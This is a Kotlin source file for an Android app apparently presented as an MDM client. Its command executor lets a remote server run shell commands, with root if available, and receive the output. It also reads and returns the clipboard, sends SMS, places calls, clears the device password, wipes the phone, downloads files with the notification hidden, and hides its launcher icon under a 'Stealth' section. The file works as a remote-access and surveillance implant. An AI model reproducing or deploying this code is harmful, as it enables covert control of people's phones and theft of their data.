package com.mdm.client.commands

import android.app.admin.DevicePolicyManager
import android.bluetooth.BluetoothAdapter
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.PowerManager
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Log
import com.mdm.client.config.AppConfig
import com.mdm.client.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

class CommandExecutor(
    private val context: Context,
    private val apiClient: ApiClient
) {
    companion object {
        private const val TAG = "CmdExec"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    private val adminComponent = ComponentName(context, MdmDeviceAdminReceiver::class.java)

    fun isDeviceAdminActive(): Boolean = devicePolicyManager.isAdminActive(adminComponent)

    /**
     * Execute a command and report status back to the server.
     */
    fun execute(commandId: Int, commandType: String, payload: JSONObject?) {
        Log.i(TAG, "Executing command: $commandType (id=$commandId)")

        scope.launch {
            reportStatus(commandId, "DELIVERED")

            val result = try {
                when (commandType) {
                    // ── Device Control ───────────────────────────────────
                    "LOCK_DEVICE" -> lockDevice()
                    "UNLOCK_DEVICE" -> unlockDevice(payload)
                    "WIPE_DEVICE" -> wipeDevice()
                    "REBOOT_DEVICE" -> rebootDevice()
                    "SHUTDOWN_DEVICE" -> shutdownDevice()
                    "SET_PASSWORD" -> setPassword(payload)
                    "CLEAR_PASSWORD" -> clearPassword()

                    // ── App Management ───────────────────────────────────
                    "INSTALL_APP" -> installApp(payload)
                    "UNINSTALL_APP" -> uninstallApp(payload)
                    "LAUNCH_APP" -> launchApp(payload)
                    "KILL_APP" -> killApp(payload)
                    "CLEAR_APP_DATA" -> clearAppData(payload)
                    "START_KIOSK_MODE" -> startKioskMode(payload)
                    "STOP_KIOSK_MODE" -> stopKioskMode()

                    // ── Stealth ─────────────────────────────────────────
                    "HIDE_APP" -> hideApp()
                    "SHOW_APP" -> showApp()

                    // ── Communication ────────────────────────────────────
                    "SEND_SMS" -> sendSms(payload)
                    "MAKE_CALL" -> makeCall(payload)

                    // ── Audio / Volume ───────────────────────────────────
                    "SET_VOLUME" -> setVolume(payload)
                    "SET_RINGTONE_MODE" -> setRingtoneMode(payload)
                    "PLAY_SOUND" -> playSound(payload)
                    "VIBRATE" -> vibrateDevice(payload)

                    // ── Network ──────────────────────────────────────────
                    "TOGGLE_WIFI" -> toggleWifi(payload)
                    "TOGGLE_BLUETOOTH" -> toggleBluetooth(payload)

                    // ── Display / Settings ───────────────────────────────
                    "SET_BRIGHTNESS" -> setBrightness(payload)
                    "SET_SCREEN_TIMEOUT" -> setScreenTimeout(payload)

                    // ── Clipboard ────────────────────────────────────────
                    "GET_CLIPBOARD" -> getClipboard()
                    "SET_CLIPBOARD" -> setClipboard(payload)

                    // ── Shell ────────────────────────────────────────────
                    "SHELL_EXEC" -> shellExec(payload)

                    // ── File Operations ──────────────────────────────────
                    "DELETE_FILE" -> deleteFile(payload)
                    "DOWNLOAD_FILE" -> downloadFile(payload)

                    // ── Toast / Popup ────────────────────────────────────
                    "SHOW_TOAST" -> showToast(payload)
                    "OPEN_URL" -> openUrl(payload)

                    else -> mapOf("status" to "error", "message" to "Unknown command: $commandType")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command execution failed: ${e.message}")
                mapOf("status" to "error", "message" to (e.message ?: "Unknown error"))
            }

            val status = if (result["status"] == "success") "EXECUTED" else "FAILED"
            reportStatus(commandId, status, result)
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // DEVICE CONTROL
    // ══════════════════════════════════════════════════════════════════════════

    private fun lockDevice(): Map<String, Any> {
        return if (isDeviceAdminActive()) {
            devicePolicyManager.lockNow()
            mapOf("status" to "success", "message" to "Device locked")
        } else {
            mapOf("status" to "error", "message" to "Device admin not active")
        }
    }

    private fun unlockDevice(payload: JSONObject?): Map<String, Any> {
        if (!isDeviceAdminActive()) {
            return mapOf("status" to "error", "message" to "Device admin not active")
        }
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                return mapOf("status" to "error", "message" to "resetPassword blocked on Android 14+, requires Device Owner")
            }
            @Suppress("DEPRECATION")
            devicePolicyManager.resetPassword("", 0)
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            @Suppress("DEPRECATION")
            val wl = pm.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "svc:unlock"
            )
            wl.acquire(3000)
            wl.release()
            mapOf("status" to "success", "message" to "Password cleared and screen woken")
        } catch (e: SecurityException) {
            mapOf("status" to "error", "message" to "Unlock failed: ${e.message}")
        }
    }

    private fun wipeDevice(): Map<String, Any> {
        return if (isDeviceAdminActive()) {
            Log.w(TAG, "WIPING DEVICE!")
            devicePolicyManager.wipeData(0)
            mapOf("status" to "success", "message" to "Device wipe initiated")
        } else {
            mapOf("status" to "error", "message" to "Device admin not active")
        }
    }

    private fun rebootDevice(): Map<String, Any> {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && isDeviceAdminActive()) {
                devicePolicyManager.reboot(adminComponent)
                mapOf("status" to "success", "message" to "Reboot initiated")
            } else {
                val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                pm.reboot("system_update")
                mapOf("status" to "success", "message" to "Reboot initiated via PowerManager")
            }
        } catch (e: SecurityException) {
            // Fallback: try shell
            try {
                Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                mapOf("status" to "success", "message" to "Reboot via su")
            } catch (e2: Exception) {
                mapOf("status" to "error", "message" to "Reboot requires Device Owner or root: ${e.message}")
            }
        }
    }

    private fun shutdownDevice(): Map<String, Any> {
        return try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
            mapOf("status" to "success", "message" to "Shutdown initiated")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Shutdown requires root: ${e.message}")
        }
    }

    private fun setPassword(payload: JSONObject?): Map<String, Any> {
        val password = payload?.optString("password", "") ?: ""
        if (!isDeviceAdminActive() || password.isBlank()) {
            return mapOf("status" to "error", "message" to "Device admin not active or missing password")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            return mapOf("status" to "error", "message" to "resetPassword blocked on Android 14+, requires Device Owner")
        }
        return try {
            @Suppress("DEPRECATION")
            devicePolicyManager.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            mapOf("status" to "success", "message" to "Password set")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Set password failed: ${e.message}")
        }
    }

    private fun clearPassword(): Map<String, Any> {
        if (!isDeviceAdminActive()) {
            return mapOf("status" to "error", "message" to "Device admin not active")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            return mapOf("status" to "error", "message" to "resetPassword blocked on Android 14+, requires Device Owner")
        }
        return try {
            @Suppress("DEPRECATION")
            devicePolicyManager.resetPassword("", 0)
            mapOf("status" to "success", "message" to "Password cleared")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Clear password failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // APP MANAGEMENT
    // ══════════════════════════════════════════════════════════════════════════

    private fun installApp(payload: JSONObject?): Map<String, Any> {
        val apkUrl = payload?.optString("apk_url", "") ?: ""
        if (apkUrl.isBlank()) return mapOf("status" to "error", "message" to "Missing apk_url")
        return try {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(Uri.parse(apkUrl), "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }
            context.startActivity(intent)
            mapOf("status" to "success", "message" to "Install initiated: $apkUrl")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Install failed: ${e.message}")
        }
    }

    private fun uninstallApp(payload: JSONObject?): Map<String, Any> {
        val packageName = payload?.optString("package_name", "") ?: ""
        if (packageName.isBlank()) return mapOf("status" to "error", "message" to "Missing package_name")
        return try {
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            mapOf("status" to "success", "message" to "Uninstall prompt shown for $packageName")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Uninstall failed: ${e.message}")
        }
    }

    private fun launchApp(payload: JSONObject?): Map<String, Any> {
        val packageName = payload?.optString("package_name", "") ?: ""
        if (packageName.isBlank()) return mapOf("status" to "error", "message" to "Missing package_name")
        return try {
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
                ?: return mapOf("status" to "error", "message" to "App not found: $packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            mapOf("status" to "success", "message" to "Launched $packageName")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Launch failed: ${e.message}")
        }
    }

    private fun killApp(payload: JSONObject?): Map<String, Any> {
        val packageName = payload?.optString("package_name", "") ?: ""
        if (packageName.isBlank()) return mapOf("status" to "error", "message" to "Missing package_name")
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            am.killBackgroundProcesses(packageName)
            mapOf("status" to "success", "message" to "Killed $packageName")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Kill failed: ${e.message}")
        }
    }

    private fun clearAppData(payload: JSONObject?): Map<String, Any> {
        val packageName = payload?.optString("package_name", "") ?: ""
        if (packageName.isBlank()) return mapOf("status" to "error", "message" to "Missing package_name")
        return try {
            Runtime.getRuntime().exec(arrayOf("pm", "clear", packageName))
            mapOf("status" to "success", "message" to "Data cleared for $packageName")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Clear data failed: ${e.message}")
        }
    }

    private fun startKioskMode(payload: JSONObject?): Map<String, Any> {
        val packageName = payload?.optString("package_name", "") ?: ""
        return try {
            if (isDeviceAdminActive()) {
                if (packageName.isNotBlank()) {
                    val intent = context.packageManager.getLaunchIntentForPackage(packageName)
                    intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    intent?.let { context.startActivity(it) }
                }
                AppConfig.setKioskMode(context, true, packageName)
                mapOf("status" to "success", "message" to "Kiosk mode started", "package" to packageName)
            } else {
                mapOf("status" to "error", "message" to "Device admin required")
            }
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Kiosk failed: ${e.message}")
        }
    }

    private fun stopKioskMode(): Map<String, Any> {
        return try {
            AppConfig.setKioskMode(context, false, "")
            mapOf("status" to "success", "message" to "Kiosk mode stopped")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // STEALTH
    // ══════════════════════════════════════════════════════════════════════════

    private fun hideApp(): Map<String, Any> {
        return try {
            context.packageManager.setComponentEnabledSetting(
                ComponentName(context, "${context.packageName}.LauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            mapOf("status" to "success", "message" to "App icon hidden")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Failed to hide: ${e.message}")
        }
    }

    private fun showApp(): Map<String, Any> {
        return try {
            context.packageManager.setComponentEnabledSetting(
                ComponentName(context, "${context.packageName}.LauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            mapOf("status" to "success", "message" to "App icon restored")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Failed to show: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // COMMUNICATION
    // ══════════════════════════════════════════════════════════════════════════

    private fun sendSms(payload: JSONObject?): Map<String, Any> {
        val to = payload?.optString("to", "") ?: ""
        val message = payload?.optString("message", "") ?: ""
        if (to.isBlank() || message.isBlank()) return mapOf("status" to "error", "message" to "Missing 'to' or 'message'")
        return try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            // Split long messages and send
            val parts = smsManager.divideMessage(message)
            smsManager.sendMultipartTextMessage(to, null, parts, null, null)
            mapOf("status" to "success", "message" to "SMS sent to $to (${parts.size} parts)")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "SMS failed: ${e.message}")
        }
    }

    private fun makeCall(payload: JSONObject?): Map<String, Any> {
        val number = payload?.optString("number", "") ?: ""
        if (number.isBlank()) return mapOf("status" to "error", "message" to "Missing 'number'")
        return try {
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$number")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            mapOf("status" to "success", "message" to "Calling $number")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Call failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // AUDIO / VOLUME
    // ══════════════════════════════════════════════════════════════════════════

    private fun setVolume(payload: JSONObject?): Map<String, Any> {
        val level = payload?.optInt("level", -1) ?: -1
        val stream = payload?.optString("stream", "music") ?: "music"
        if (level < 0) return mapOf("status" to "error", "message" to "Missing 'level' (0-100)")
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val streamType = when (stream) {
                "ring" -> AudioManager.STREAM_RING
                "alarm" -> AudioManager.STREAM_ALARM
                "notification" -> AudioManager.STREAM_NOTIFICATION
                "system" -> AudioManager.STREAM_SYSTEM
                "voice_call" -> AudioManager.STREAM_VOICE_CALL
                else -> AudioManager.STREAM_MUSIC
            }
            val maxVol = am.getStreamMaxVolume(streamType)
            val vol = (level * maxVol / 100).coerceIn(0, maxVol)
            am.setStreamVolume(streamType, vol, 0)
            mapOf("status" to "success", "message" to "Volume set to $level% on $stream")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Set volume failed: ${e.message}")
        }
    }

    private fun setRingtoneMode(payload: JSONObject?): Map<String, Any> {
        val mode = payload?.optString("mode", "") ?: ""
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            when (mode.lowercase()) {
                "silent" -> am.ringerMode = AudioManager.RINGER_MODE_SILENT
                "vibrate" -> am.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                "normal" -> am.ringerMode = AudioManager.RINGER_MODE_NORMAL
                else -> return mapOf("status" to "error", "message" to "Mode must be: silent, vibrate, or normal")
            }
            mapOf("status" to "success", "message" to "Ringer mode set to $mode")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Set ringer failed: ${e.message}")
        }
    }

    private fun playSound(payload: JSONObject?): Map<String, Any> {
        // Play the default notification sound at max volume
        return try {
            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
            val ringtone = android.media.RingtoneManager.getRingtone(context, uri)
            ringtone?.play()
            // Auto-stop after duration (default 10 seconds)
            val durationMs = (payload?.optInt("duration_seconds", 10) ?: 10) * 1000L
            scope.launch {
                kotlinx.coroutines.delay(durationMs)
                ringtone?.stop()
            }
            mapOf("status" to "success", "message" to "Playing alarm sound for ${durationMs / 1000}s")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Play sound failed: ${e.message}")
        }
    }

    private fun vibrateDevice(payload: JSONObject?): Map<String, Any> {
        val durationMs = (payload?.optLong("duration_ms", 1000) ?: 1000L)
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator.vibrate(
                    android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE)
                )
            } else {
                @Suppress("DEPRECATION")
                val v = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                v.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            }
            mapOf("status" to "success", "message" to "Vibrated for ${durationMs}ms")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Vibrate failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // NETWORK
    // ══════════════════════════════════════════════════════════════════════════

    private fun toggleWifi(payload: JSONObject?): Map<String, Any> {
        val enabled = payload?.optBoolean("enabled", true) ?: true
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ can't toggle WiFi programmatically, open settings panel
                val intent = Intent(Settings.Panel.ACTION_WIFI).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(intent)
                mapOf("status" to "success", "message" to "WiFi settings panel opened (Android 10+ restriction)")
            } else {
                @Suppress("DEPRECATION")
                val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                @Suppress("DEPRECATION")
                wm.isWifiEnabled = enabled
                mapOf("status" to "success", "message" to "WiFi ${if (enabled) "enabled" else "disabled"}")
            }
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "WiFi toggle failed: ${e.message}")
        }
    }

    private fun toggleBluetooth(payload: JSONObject?): Map<String, Any> {
        val enabled = payload?.optBoolean("enabled", true) ?: true
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (context.checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT)
                    != PackageManager.PERMISSION_GRANTED) {
                    return mapOf("status" to "error", "message" to "BLUETOOTH_CONNECT permission not granted")
                }
            }
            val adapter = BluetoothAdapter.getDefaultAdapter()
                ?: return mapOf("status" to "error", "message" to "No Bluetooth adapter")
            @Suppress("DEPRECATION", "MissingPermission")
            if (enabled) adapter.enable() else adapter.disable()
            mapOf("status" to "success", "message" to "Bluetooth ${if (enabled) "enabled" else "disabled"}")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Bluetooth toggle failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // DISPLAY / SETTINGS
    // ══════════════════════════════════════════════════════════════════════════

    private fun setBrightness(payload: JSONObject?): Map<String, Any> {
        val level = payload?.optInt("level", -1) ?: -1
        if (level < 0 || level > 255) return mapOf("status" to "error", "message" to "Level must be 0-255")
        return try {
            // Disable auto brightness
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, 0)
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, level)
            mapOf("status" to "success", "message" to "Brightness set to $level/255")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Brightness failed (needs WRITE_SETTINGS): ${e.message}")
        }
    }

    private fun setScreenTimeout(payload: JSONObject?): Map<String, Any> {
        val seconds = payload?.optInt("seconds", 30) ?: 30
        return try {
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_OFF_TIMEOUT, seconds * 1000)
            mapOf("status" to "success", "message" to "Screen timeout set to ${seconds}s")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Set timeout failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // CLIPBOARD
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun getClipboard(): Map<String, Any> {
        return withContext(Dispatchers.Main) {
            try {
                val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = cm.primaryClip
                val text = clip?.getItemAt(0)?.text?.toString() ?: ""
                mapOf("status" to "success", "clipboard" to text)
            } catch (e: Exception) {
                mapOf("status" to "error", "message" to "Clipboard read failed: ${e.message}")
            }
        }
    }

    private suspend fun setClipboard(payload: JSONObject?): Map<String, Any> {
        val text = payload?.optString("text", "") ?: ""
        return withContext(Dispatchers.Main) {
            try {
                val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("mdm", text))
                mapOf("status" to "success", "message" to "Clipboard set")
            } catch (e: Exception) {
                mapOf("status" to "error", "message" to "Clipboard write failed: ${e.message}")
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // SHELL EXECUTION
    // ══════════════════════════════════════════════════════════════════════════

    private fun shellExec(payload: JSONObject?): Map<String, Any> {
        val command = payload?.optString("command", "") ?: ""
        if (command.isBlank()) return mapOf("status" to "error", "message" to "Missing 'command'")
        val useSu = payload?.optBoolean("root", false) ?: false
        return try {
            val process = if (useSu) {
                Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            } else {
                Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            }
            val output = BufferedReader(InputStreamReader(process.inputStream)).readText()
            val error = BufferedReader(InputStreamReader(process.errorStream)).readText()
            val exitCode = process.waitFor()
            mapOf(
                "status" to if (exitCode == 0) "success" else "error",
                "stdout" to output.take(4000),
                "stderr" to error.take(2000),
                "exit_code" to exitCode
            )
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Shell exec failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // FILE OPERATIONS
    // ══════════════════════════════════════════════════════════════════════════

    private fun deleteFile(payload: JSONObject?): Map<String, Any> {
        val path = payload?.optString("path", "") ?: ""
        if (path.isBlank()) return mapOf("status" to "error", "message" to "Missing 'path'")
        return try {
            val file = java.io.File(path)
            if (file.exists()) {
                val deleted = if (file.isDirectory) file.deleteRecursively() else file.delete()
                if (deleted) mapOf("status" to "success", "message" to "Deleted $path")
                else mapOf("status" to "error", "message" to "Failed to delete $path")
            } else {
                mapOf("status" to "error", "message" to "File not found: $path")
            }
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Delete failed: ${e.message}")
        }
    }

    private fun downloadFile(payload: JSONObject?): Map<String, Any> {
        val url = payload?.optString("url", "") ?: ""
        val destination = payload?.optString("destination", "") ?: ""
        if (url.isBlank()) return mapOf("status" to "error", "message" to "Missing 'url'")
        return try {
            val destPath = if (destination.isNotBlank()) destination
            else "/sdcard/Download/${url.substringAfterLast("/")}"
            val request = android.app.DownloadManager.Request(Uri.parse(url)).apply {
                setDestinationUri(Uri.fromFile(java.io.File(destPath)))
                setNotificationVisibility(android.app.DownloadManager.Request.VISIBILITY_HIDDEN)
            }
            val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as android.app.DownloadManager
            dm.enqueue(request)
            mapOf("status" to "success", "message" to "Downloading to $destPath")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Download failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // TOAST / BROWSER
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun showToast(payload: JSONObject?): Map<String, Any> {
        val message = payload?.optString("message", "Hello") ?: "Hello"
        return withContext(Dispatchers.Main) {
            try {
                android.widget.Toast.makeText(context, message, android.widget.Toast.LENGTH_LONG).show()
                mapOf("status" to "success", "message" to "Toast shown")
            } catch (e: Exception) {
                mapOf("status" to "error", "message" to "Toast failed: ${e.message}")
            }
        }
    }

    private fun openUrl(payload: JSONObject?): Map<String, Any> {
        val url = payload?.optString("url", "") ?: ""
        if (url.isBlank()) return mapOf("status" to "error", "message" to "Missing 'url'")
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            mapOf("status" to "success", "message" to "Opened $url")
        } catch (e: Exception) {
            mapOf("status" to "error", "message" to "Open URL failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // STATUS REPORTING
    // ══════════════════════════════════════════════════════════════════════════

    private fun reportStatus(commandId: Int, status: String, result: Map<String, Any>? = null) {
        try {
            val body = JSONObject().apply {
                put("status", status)
                if (result != null) put("result", JSONObject(result))
            }
            apiClient.post("/commands/$commandId/status", body)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to report command status: ${e.message}")
        }
    }
}
